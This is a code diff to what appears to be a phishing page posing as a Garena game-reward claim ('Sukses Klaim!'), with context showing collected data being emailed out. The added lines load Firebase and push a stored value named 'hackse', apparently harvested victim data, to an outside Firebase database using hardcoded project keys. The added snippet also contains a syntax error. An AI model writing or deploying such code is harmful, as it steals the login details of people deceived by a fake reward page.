@@ -88,6 +88,31 @@ $datamail = mail($tomail,$subject, $message, $headersx);
 <img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Sukses Klaim!</span></div><div class="a_wrap"><div></div>
 <br><div><div></a></span></div>
 
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+<script type="text/javascript">
+
+var firebaseConfig = {
+    apiKey: "AIzaSyAIgCzDycY8Ya7XUzlx8kzUa_01zlFIKJg",
+    authDomain: "the-web-99030.firebaseapp.com",
+    databaseURL: "https://the-web-99030.firebaseio.com",
+    projectId: "the-web-99030",
+    storageBucket: "the-web-99030.appspot.com",
+    messagingSenderId: "793051782942",
+    appId: "1:793051782942:web:2d59b3aa02097e25da730f"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  
+  var ref = firebase.database().ref('users');
+ 
+
+  ref.push().set(
+    localStorage.getItem("hackse");
+
+  );
+
+</script>
 <br>
 <br><div><div></a></span></div>
 <p><h5>Succes Claim!</h5></p>
